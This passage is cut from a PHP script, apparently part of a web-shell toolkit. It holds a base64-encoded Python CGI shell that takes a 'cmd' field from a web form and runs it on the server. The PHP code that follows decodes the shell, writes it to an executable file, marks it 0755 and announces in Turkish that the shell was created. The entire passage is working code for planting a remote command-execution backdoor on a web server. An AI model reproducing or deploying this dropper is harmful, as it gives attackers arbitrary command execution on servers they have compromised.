dHJmdGltZQppbXBvcnQgdHJhY2ViYWNrCmZyb20gU3RyaW5nSU8gaW1wb3J0IFN0cmluZ0lPCmZy
b20gdHJhY2ViYWNrIGltcG9ydCBwcmludF9leGMKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKIyBjb25zdGFudHMKCmZvbnRs
aW5lID0gJzxGT05UIENPTE9SPSM0MjQyNDIgc3R5bGU9ImZvbnQtZmFtaWx5OnRpbWVzO2ZvbnQt
c2l6ZToxMnB0OyI+Jwp2ZXJzaW9uc3RyaW5nID0gJ1ZlcnNpb24gMS4wLjAgN3RoIEp1bHkgMjAw
NCcKCmlmIG9zLmVudmlyb24uaGFzX2tleSgiU0NSSVBUX05BTUUiKToKICAgIHNjcmlwdG5hbWUg
PSBvcy5lbnZpcm9uWyJTQ1JJUFRfTkFNRSJdCmVsc2U6CiAgICBzY3JpcHRuYW1lID0gIiIKCk1F
VEhPRCA9ICciUE9TVCInCgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCiMgUHJpdmF0ZSBmdW5jdGlvbnMgYW5kIHZhcmlhYmxl
cwoKZGVmIGdldGZvcm0odmFsdWVsaXN0LCB0aGVmb3JtLCBub3RwcmVzZW50PScnKToKICAgICIi
IlRoaXMgZnVuY3Rpb24sIGdpdmVuIGEgQ0dJIGZvcm0sIGV4dHJhY3RzIHRoZSBkYXRhIGZyb20g
aXQsIGJhc2VkIG9uCiAgICB2YWx1ZWxpc3QgcGFzc2VkIGluLiBBbnkgbm9uLXByZXNlbnQgdmFs
dWVzIGFyZSBzZXQgdG8gJycgLSBhbHRob3VnaCB0aGlzIGNhbiBiZSBjaGFuZ2VkLgogICAgKGUu
Zy4gdG8gcmV0dXJuIE5vbmUgc28geW91IGNhbiB0ZXN0IGZvciBtaXNzaW5nIGtleXdvcmRzIC0g
d2hlcmUgJycgaXMgYSB2YWxpZCBhbnN3ZXIgYnV0IHRvIGhhdmUgdGhlIGZpZWxkIG1pc3Npbmcg
aXNuJ3QuKSIiIgogICAgZGF0YSA9IHt9CiAgICBmb3IgZmllbGQgaW4gdmFsdWVsaXN0OgogICAg
ICAgIGlmIG5vdCB0aGVmb3JtLmhhc19rZXkoZmllbGQpOgogICAgICAgICAgICBkYXRhW2ZpZWxk
XSA9IG5vdHByZXNlbnQKICAgICAgICBlbHNlOgogICAgICAgICAgICBpZiAgdHlwZSh0aGVmb3Jt
W2ZpZWxkXSkgIT0gdHlwZShbXSk6CiAgICAgICAgICAgICAgICBkYXRhW2ZpZWxkXSA9IHRoZWZv
cm1bZmllbGRdLnZhbHVlCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICB2YWx1ZXMg
PSBtYXAobGFtYmRhIHg6IHgudmFsdWUsIHRoZWZvcm1bZmllbGRdKSAgICAgIyBhbGxvd3MgZm9y
IGxpc3QgdHlwZSB2YWx1ZXMKICAgICAgICAgICAgICAgIGRhdGFbZmllbGRdID0gdmFsdWVzCiAg
ICByZXR1cm4gZGF0YQoKCnRoZWZvcm1oZWFkID0gIiIiPEhUTUw+PEhFQUQ+PFRJVExFPmNnaS1z
aGVsbC5weSAtIGEgQ0dJIGJ5IEZ1enp5bWFuPC9USVRMRT48L0hFQUQ+CjxCT0RZPjxDRU5URVI+
CjxIMT5XZWxjb21lIHRvIGNnaS1zaGVsbC5weSAtIDxCUj5hIFB5dGhvbiBDR0k8L0gxPgo8Qj48
ST5CeSBGdXp6eW1hbjwvQj48L0k+PEJSPgoiIiIrZm9udGxpbmUgKyJWZXJzaW9uIDogIiArIHZl
cnNpb25zdHJpbmcgKyAiIiIsIFJ1bm5pbmcgb24gOiAiIiIgKyBzdHJmdGltZSgnJUk6JU0gJXAs
ICVBICVkICVCLCAlWScpKycuPC9DRU5URVI+PEJSPicKCnRoZWZvcm0gPSAiIiI8SDI+RW50ZXIg
Q29tbWFuZDwvSDI+CjxGT1JNIE1FVEhPRD1cIiIiIiArIE1FVEhPRCArICciIGFjdGlvbj0iJyAr
IHNjcmlwdG5hbWUgKyAiIiJcIj4KPGlucHV0IG5hbWU9Y21kIHR5cGU9dGV4dD48QlI+CjxpbnB1
dCB0eXBlPXN1Ym1pdCB2YWx1ZT0iU3VibWl0Ij48QlI+CjwvRk9STT48QlI+PEJSPiIiIgpib2R5
ZW5kID0gJzwvQk9EWT48L0hUTUw+JwplcnJvcm1lc3MgPSAnPENFTlRFUj48SDI+U29tZXRoaW5n
IFdlbnQgV3Jvbmc8L0gyPjxCUj48UFJFPicKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKIyBtYWluIGJvZHkgb2YgdGhlIHNj
cmlwdAoKaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoKICAgIHByaW50ICJDb250ZW50LXR5cGU6
IHRleHQvaHRtbCIgICAgICAgICAjIHRoaXMgaXMgdGhlIGhlYWRlciB0byB0aGUgc2VydmVyCiAg
ICBwcmludCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBzbyBpcyB0aGlzIGJs
YW5rIGxpbmUKICAgIGZvcm0gPSBjZ2kuRmllbGRTdG9yYWdlKCkKICAgIGRhdGEgPSBnZXRmb3Jt
KFsnY21kJ10sZm9ybSkKICAgIHRoZWNtZCA9IGRhdGFbJ2NtZCddCiAgICBwcmludCB0aGVmb3Jt
aGVhZAogICAgcHJpbnQgdGhlZm9ybQogICAgaWYgdGhlY21kOgogICAgICAgIHByaW50ICc8SFI+
PEJSPjxCUj4nCiAgICAgICAgcHJpbnQgJzxCPkNvbW1hbmQgOiAnLCB0aGVjbWQsICc8QlI+PEJS
PicKICAgICAgICBwcmludCAnUmVzdWx0IDogPEJSPjxCUj4nCiAgICAgICAgdHJ5OgogICAgICAg
ICAgICBjaGlsZF9zdGRpbiwgY2hpbGRfc3Rkb3V0ID0gb3MucG9wZW4yKHRoZWNtZCkKICAgICAg
ICAgICAgY2hpbGRfc3RkaW4uY2xvc2UoKQogICAgICAgICAgICByZXN1bHQgPSBjaGlsZF9zdGRv
dXQucmVhZCgpCiAgICAgICAgICAgIGNoaWxkX3N0ZG91dC5jbG9zZSgpCiAgICAgICAgICAgIHBy
aW50IHJlc3VsdC5yZXBsYWNlKCdcbicsICc8QlI+JykKCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlv
biwgZTogICAgICAgICAgICAgICAgICAgICAgIyBhbiBlcnJvciBpbiBleGVjdXRpbmcgdGhlIGNv
bW1hbmQKICAgICAgICAgICAgcHJpbnQgZXJyb3JtZXNzCiAgICAgICAgICAgIGYgPSBTdHJpbmdJ
TygpCiAgICAgICAgICAgIHByaW50X2V4YyhmaWxlPWYpCiAgICAgICAgICAgIGEgPSBmLmdldHZh
bHVlKCkuc3BsaXRsaW5lcygpCiAgICAgICAgICAgIGZvciBsaW5lIGluIGE6CiAgICAgICAgICAg
ICAgICBwcmludCBsaW5lCgogICAgcHJpbnQgYm9keWVuZAoKCiIiIgpUT0RPL0lTU1VFUwoKCgpD
SEFOR0VMT0cKCjA3LTA3LTA0ICAgICAgICBWZXJzaW9uIDEuMC4wCkEgdmVyeSBiYXNpYyBzeXN0
ZW0gZm9yIGV4ZWN1dGluZyBzaGVsbCBjb21tYW5kcy4KSSBtYXkgZXhwYW5kIGl0IGludG8gYSBw
cm9wZXIgJ2Vudmlyb25tZW50JyB3aXRoIHNlc3Npb24gcGVyc2lzdGVuY2UuLi4KIiIi';
	$file = fopen("python.izo" ,"w+");
	$write = fwrite ($file ,base64_decode($pythonp));
	fclose($file);
	chmod("python.izo",0755);
	echo '<center><p>Python Cgi Olusturuldu! Asagidaki Baglantiya Tiklayabilirsiniz :)</p><a href=pythoncgi/python.izo target="_blank">Python Cgi</a></center>';
}
?>